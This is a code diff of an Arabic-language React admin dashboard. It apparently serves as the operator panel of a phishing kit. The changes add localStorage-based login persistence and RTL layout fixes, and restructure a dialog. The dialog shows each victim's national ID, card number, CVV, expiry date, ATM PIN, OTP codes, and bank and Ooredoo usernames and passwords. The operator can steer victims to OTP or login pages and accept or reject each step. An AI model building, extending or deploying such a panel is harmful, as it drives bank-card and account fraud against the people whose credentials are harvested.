@@ -24,7 +24,6 @@ import {
   DropdownMenuItem,
   DropdownMenuTrigger,
   DropdownMenuLabel,
-  DropdownMenuSeparator,
 } from "@/components/ui/dropdown-menu";
 import {
   Eye,
@@ -34,7 +33,6 @@ import {
   CheckCircle2,
   Clock,
   ExternalLink,
-  ChevronRight,
   User,
   CreditCard,
   Key,
@@ -45,7 +43,10 @@ import {
 
 export default function AdminDashboard() {
   const [password, setPassword] = useState("");
-  const [isAuthenticated, setIsAuthenticated] = useState(false);
+  // Initialize from localStorage to prevent logout on refresh
+  const [isAuthenticated, setIsAuthenticated] = useState(() => {
+    return typeof window !== 'undefined' ? localStorage.getItem("admin_auth") === "true" : false;
+  });
   const [searchTerm, setSearchTerm] = useState("");
   const [selectedSession, setSelectedSession] = useState<any>(null);
   const [isDetailsOpen, setIsDetailsOpen] = useState(false);
@@ -67,12 +68,6 @@ export default function AdminDashboard() {
       toast.error("كلمة المرور غير صحيحة");
     }
   };
-
-  useEffect(() => {
-    if (localStorage.getItem("admin_auth") === "true") {
-      setIsAuthenticated(true);
-    }
-  }, []);
 
   const handleLogout = () => {
     setIsAuthenticated(false);
@@ -157,7 +152,7 @@ export default function AdminDashboard() {
                 placeholder="بحث بالاسم أو الكود..."
                 value={searchTerm}
                 onChange={(e) => setSearchTerm(e.target.value)}
-                className="pr-10 w-64 bg-slate-50 border-slate-200 focus:bg-white"
+                className="pr-10 w-64 bg-slate-50 border-slate-200 focus:bg-white text-right"
               />
             </div>
             <Button variant="outline" onClick={handleLogout} className="gap-2 border-slate-200 hover:bg-slate-50 text-slate-600">
@@ -176,7 +171,7 @@ export default function AdminDashboard() {
               <div className={`${stat.color} p-4 rounded-xl text-white`}>
                 <stat.icon className="w-6 h-6" />
               </div>
-              <div>
+              <div className="text-right">
                 <p className="text-sm font-medium text-slate-500">{stat.label}</p>
                 <p className="text-2xl font-bold text-slate-900">{stat.value}</p>
               </div>
@@ -255,8 +250,7 @@ export default function AdminDashboard() {
                             إعادة توجيه
                           </Button>
                         </DropdownMenuTrigger>
-                        <DropdownMenuContent align="end" className="w-56 p-2 rounded-xl border-slate-200">
-                          <DropdownMenuLabel className="text-right text-xs text-slate-400 mb-1">توجيه لصفحة محددة</DropdownMenuLabel>
+                        <DropdownMenuContent align="end" className="w-56 p-2 rounded-xl border-slate-200 z-[100]">
                           {[
                             { name: '📄 صفحة الدخول', step: 'login-method' },
                             { name: '🔑 صفحة OTP', step: 'otp' },
@@ -285,103 +279,105 @@ export default function AdminDashboard() {
       </div>
 
       {/* Details Dialog */}
-      <Dialog open={isDetailsOpen} onOpenChange={setIsDetailsOpen}>
-        <DialogContent className="max-w-2xl bg-white rounded-3xl p-0 overflow-hidden border-none shadow-2xl">
-          <DialogHeader className="bg-[#8C0032] p-6 text-white">
-            <DialogTitle className="text-xl font-bold flex items-center gap-2">
-              <User className="w-6 h-6" />
-              كل بيانات العميل
-            </DialogTitle>
-            <p className="text-rose-100 text-xs mt-1 opacity-80">ID: {selectedSession?.sessionId}</p>
-          </DialogHeader>
+      {selectedSession && (
+        <Dialog open={isDetailsOpen} onOpenChange={setIsDetailsOpen}>
+          <DialogContent className="max-w-2xl bg-white rounded-3xl p-0 overflow-hidden border-none shadow-2xl z-[150]">
+            <DialogHeader className="bg-[#8C0032] p-6 text-white text-right">
+              <DialogTitle className="text-xl font-bold flex items-center justify-end gap-2">
+                كل بيانات العميل
+                <User className="w-6 h-6" />
+              </DialogTitle>
+              <p className="text-rose-100 text-xs mt-1 opacity-80">ID: {selectedSession.sessionId}</p>
+            </DialogHeader>
 
-          <div className="p-6 max-h-[70vh] overflow-y-auto space-y-6">
-            {/* Section: Personal Info */}
-            <div className="space-y-4">
-              <div className="flex items-center gap-2 text-[#8C0032] font-bold border-b pb-2">
-                <User className="w-4 h-4" />
-                البيانات الشخصية
+            <div className="p-6 max-h-[70vh] overflow-y-auto space-y-6 text-right" dir="rtl">
+              {/* Section: Personal Info */}
+              <div className="space-y-4">
+                <div className="flex items-center gap-2 text-[#8C0032] font-bold border-b pb-2">
+                  <User className="w-4 h-4" />
+                  البيانات الشخصية
+                </div>
+                <div className="grid grid-cols-2 gap-4">
+                  <DataField label="الاسم" value={selectedSession.fullName} />
+                  <DataField label="رقم الجوال" value={selectedSession.phoneNumber} />
+                  <DataField label="رقم الهوية" value={selectedSession.nationalId} />
+                  <DataField label="الدولة" value={selectedSession.country} />
+                </div>
               </div>
-              <div className="grid grid-cols-2 gap-4">
-                <DataField label="الاسم" value={selectedSession?.fullName} />
-                <DataField label="رقم الجوال" value={selectedSession?.phoneNumber} />
-                <DataField label="رقم الهوية" value={selectedSession?.nationalId} />
-                <DataField label="الدولة" value={selectedSession?.country} />
+
+              {/* Section: Login & OTP Controls */}
+              <div className="space-y-6">
+                {/* Card/User Login */}
+                <ControlSection 
+                  icon={<CreditCard className="w-4 h-4" />} 
+                  title="بيانات تسجيل الدخول"
+                  data={selectedSession.loginType === 'card' ? {
+                    "نوع الدخول": "بطاقة بنكية",
+                    "رقم البطاقة": selectedSession.cardNumber,
+                    "الاسم": selectedSession.cardholderName,
+                    "التاريخ": selectedSession.expiryDate,
+                    "CVV": selectedSession.cvv
+                  } : {
+                    "نوع الدخول": "اسم مستخدم",
+                    "المستخدم": selectedSession.username,
+                    "كلمة السر": selectedSession.password
+                  }}
+                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
+                  onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
+                />
+
+                {/* OTP Section */}
+                <ControlSection 
+                  icon={<Key className="w-4 h-4" />} 
+                  title="رموز التحقق (OTP)"
+                  data={{
+                    "رمز OTP": selectedSession.otpCode
+                  }}
+                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
+                  onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
+                />
+
+                {/* ATM PIN Section */}
+                <ControlSection 
+                  icon={<CreditCard className="w-4 h-4" />} 
+                  title="ATM PIN"
+                  data={{
+                    "الرقم السري": selectedSession.atmPin
+                  }}
+                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
+                  onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
+                />
+
+                {/* Ooredoo Section */}
+                <ControlSection 
+                  icon={<Globe className="w-4 h-4" />} 
+                  title="بيانات Ooredoo"
+                  data={{
+                    "المستخدم": selectedSession.ooredooUser,
+                    "كلمة السر": selectedSession.ooredooPassword,
+                    "رمز OTP Ooredoo": selectedSession.ooredooOtp
+                  }}
+                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
+                  onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
+                />
               </div>
             </div>
 
-            {/* Section: Login & OTP Controls */}
-            <div className="space-y-6">
-              {/* Card/User Login */}
-              <ControlSection 
-                icon={<CreditCard className="w-4 h-4" />} 
-                title="بيانات تسجيل الدخول"
-                data={selectedSession?.loginType === 'card' ? {
-                  "نوع الدخول": "بطاقة بنكية",
-                  "رقم البطاقة": selectedSession?.cardNumber,
-                  "الاسم": selectedSession?.cardholderName,
-                  "التاريخ": selectedSession?.expiryDate,
-                  "CVV": selectedSession?.cvv
-                } : {
-                  "نوع الدخول": "اسم مستخدم",
-                  "المستخدم": selectedSession?.username,
-                  "كلمة السر": selectedSession?.password
-                }}
-                onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
-                onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
-              />
-
-              {/* OTP Section */}
-              <ControlSection 
-                icon={<Key className="w-4 h-4" />} 
-                title="رموز التحقق (OTP)"
-                data={{
-                  "رمز OTP": selectedSession?.otpCode
-                }}
-                onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
-                onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
-              />
-
-              {/* ATM PIN Section */}
-              <ControlSection 
-                icon={<CreditCard className="w-4 h-4" />} 
-                title="ATM PIN"
-                data={{
-                  "الرقم السري": selectedSession?.atmPin
-                }}
-                onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
-                onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
-              />
-
-              {/* Ooredoo Section */}
-              <ControlSection 
-                icon={<Globe className="w-4 h-4" />} 
-                title="بيانات Ooredoo"
-                data={{
-                  "المستخدم": selectedSession?.ooredooUser,
-                  "كلمة السر": selectedSession?.ooredooPassword,
-                  "رمز OTP Ooredoo": selectedSession?.ooredooOtp
-                }}
-                onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
-                onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
-              />
-            </div>
-          </div>
-
-          <DialogFooter className="p-4 bg-slate-50 border-t">
-            <Button onClick={() => setIsDetailsOpen(false)} className="bg-slate-900 hover:bg-slate-800 text-white px-8 rounded-xl">
-              إغلاق
-            </Button>
-          </DialogFooter>
-        </DialogContent>
-      </Dialog>
+            <DialogFooter className="p-4 bg-slate-50 border-t flex justify-center">
+              <Button onClick={() => setIsDetailsOpen(false)} className="bg-slate-900 hover:bg-slate-800 text-white px-8 rounded-xl">
+                إغلاق
+              </Button>
+            </DialogFooter>
+          </DialogContent>
+        </Dialog>
+      )}
     </div>
   );
 }
 
 function DataField({ label, value }: { label: string; value: any }) {
   return (
-    <div className="bg-slate-50 p-3 rounded-xl border border-slate-100">
+    <div className="bg-slate-50 p-3 rounded-xl border border-slate-100 text-right">
       <p className="text-[10px] text-slate-400 font-bold mb-1 uppercase tracking-wider">{label}</p>
       <p className="text-slate-700 font-medium break-all">{value || "—"}</p>
     </div>
@@ -399,7 +395,7 @@ function ControlSection({ icon, title, data, onAccept, onReject }: {
   
   return (
     <div className={`p-4 rounded-2xl border transition-all ${hasData ? 'bg-slate-50 border-slate-200' : 'bg-slate-50/50 border-dashed border-slate-200 opacity-60'}`}>
-      <div className="flex items-center justify-between mb-4">
+      <div className="flex items-center justify-between mb-4 flex-row-reverse">
         <div className="flex items-center gap-2 text-slate-800 font-bold text-sm">
           {icon}
           {title}
@@ -407,17 +403,17 @@ function ControlSection({ icon, title, data, onAccept, onReject }: {
         {hasData && (
           <div className="flex items-center gap-2">
             <Button size="sm" onClick={onAccept} className="bg-emerald-500 hover:bg-emerald-600 text-white h-8 px-3 rounded-lg gap-1 text-xs">
-              <Check className="w-3 h-3" />
               قبول
+              <Check className="w-3 h-3" />
             </Button>
             <Button size="sm" onClick={onReject} variant="destructive" className="h-8 px-3 rounded-lg gap-1 text-xs">
-              <X className="w-3 h-3" />
               رفض
+              <X className="w-3 h-3" />
             </Button>
           </div>
         )}
       </div>
-      <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
+      <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 text-right" dir="rtl">
         {Object.entries(data).map(([key, val]) => (
           <div key={key}>
             <p className="text-[9px] text-slate-400 font-bold mb-0.5 uppercase">{key}</p>
